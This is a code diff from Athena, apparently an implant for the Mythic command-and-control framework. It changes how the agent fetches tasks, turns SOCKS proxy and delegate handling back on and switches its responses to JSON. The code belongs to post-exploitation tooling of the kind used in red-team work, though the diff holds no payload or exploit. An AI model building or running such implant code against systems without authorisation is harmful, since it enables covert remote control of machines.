@@ -1,5 +1,4 @@
-﻿#define NATIVEAOT
-using Athena.Commands;
+﻿using Athena.Commands;
 using Athena.Commands.Model;
 using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Checkin;
@@ -133,7 +132,7 @@ profiles.Add("Athena.Profiles.Discord");
 profiles.Add("Athena.Profiles.SMB");
 #endif
 #if DEBUG
-            profiles.Add("Athena.Profiles.Slack");
+            profiles.Add("Athena.Profiles.Debug");
 #endif
 
 #if NATIVEAOT
@@ -262,7 +261,7 @@ profiles.Add("Athena.Forwarders.Empty");
         //public async Task<List<MythicTask>> GetTasks(List<object> responses, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
         public async Task<List<MythicTask>> GetTasks()
         {
-            List<ResponseResult> responses = await this.commandHandler.GetResponses();
+            List<string> responses = await this.commandHandler.GetResponses();
             GetTasking gt = new GetTasking()
             {
                 action = "get_tasking",
@@ -296,9 +295,7 @@ profiles.Add("Athena.Forwarders.Empty");
         /// <param name="responseString">Response from the Mythic server</param>
         private async Task<List<MythicTask>> HandleGetTaskingResponse(string responseString)
         {
-            Console.WriteLine(responseString);
             GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-            Console.WriteLine(gtr.tasks.Count);
             if (gtr is null)
             {
                 return null;
@@ -309,7 +306,7 @@ profiles.Add("Athena.Forwarders.Empty");
             {
                 try
                 {
-                    //HandleSocks(gtr.socks);
+                    HandleSocks(gtr.socks);
                 }
                 catch (Exception e)
                 {
@@ -321,7 +318,7 @@ profiles.Add("Athena.Forwarders.Empty");
             {
                 try
                 {
-                    //HandleDelegates(gtr.delegates);
+                    HandleDelegates(gtr.delegates);
                 }
                 catch (Exception e)
                 {
@@ -332,18 +329,12 @@ profiles.Add("Athena.Forwarders.Empty");
             {
                 try
                 {
-                    //HandleMythicResponses(gtr.responses);
+                    HandleMythicResponses(gtr.responses);
                 }
                 catch (Exception e)
                 {
                 }
             }
-            //List<MythicTask> tasks = new List<MythicTask>();
-            //foreach(string task in gtr.tasks)
-            //{
-            //    MythicTask t = JsonSerializer.Deserialize(task, MythicTaskJsonContext.Default.MythicTask);
-            //    tasks.Add(t);
-            //}
 
             return gtr.tasks;
         }
@@ -377,7 +368,7 @@ profiles.Add("Athena.Forwarders.Empty");
             }
             result.user_output = sb.ToString();
 
-            _ = commandHandler.AddResponse(result);
+            _ = commandHandler.AddResponse(result.ToJson());
 
         }
         /// <summary>
@@ -406,7 +397,7 @@ profiles.Add("Athena.Forwarders.Empty");
             }
             result.user_output = sb.ToString();
 
-            _ = commandHandler.AddResponse(result);
+            _ = commandHandler.AddResponse(result.ToJson());
         }
         /// <summary>
         /// EventHandler to set the current forwarder
@@ -434,7 +425,7 @@ profiles.Add("Athena.Forwarders.Empty");
             }
             result.user_output = sb.ToString();
 
-            _ = commandHandler.AddResponse(result);
+            _ = commandHandler.AddResponse(result.ToJson());
         }
         /// <summary>
         /// EventHandler to start the forwarder
@@ -452,7 +443,7 @@ profiles.Add("Athena.Forwarders.Empty");
                 user_output = res ? "Forwarder started" : "Forwarder failed to start",
             };
 
-            _ = commandHandler.AddResponse(result);
+            _ = commandHandler.AddResponse(result.ToJson());
         }
         /// <summary>
         /// EventHandler to stop the forwarder
@@ -467,7 +458,7 @@ profiles.Add("Athena.Forwarders.Empty");
                 user_output = "Unlinked from agent",
                 task_id = e.job.task.id,
                 completed = "true",
-            });
+            }.ToJson());
         }
         /// <summary>
         /// EventHandler to update the Sleep and Jitter
@@ -483,7 +474,7 @@ profiles.Add("Athena.Forwarders.Empty");
                     user_output = "Socks Started",
                     completed = "true",
                     task_id = e.job.task.id,
-                });
+                }.ToJson());
             }
             else
             {
@@ -493,7 +484,7 @@ profiles.Add("Athena.Forwarders.Empty");
                     completed = "true",
                     task_id = e.job.task.id,
                     status = "error"
-                });
+                }.ToJson());
             }
         }
         /// <summary>
@@ -510,7 +501,7 @@ profiles.Add("Athena.Forwarders.Empty");
                     user_output = "Socks stopped",
                     completed = "true",
                     task_id = e.job.task.id,
-                });
+                }.ToJson());
             }
             else
             {
@@ -520,7 +511,7 @@ profiles.Add("Athena.Forwarders.Empty");
                     completed = "true",
                     task_id = e.job.task.id,
                     status = "error"
-                });
+                }.ToJson());
             }
         }
         /// <summary>
@@ -535,7 +526,7 @@ profiles.Add("Athena.Forwarders.Empty");
                 user_output = @"Wisdom's daughter walks alone. The mark of Athena burns through Rome",
                 completed = "true",
                 task_id = e.job.task.id,
-            });
+            }.ToJson());
             this.exit = true;
         }
 
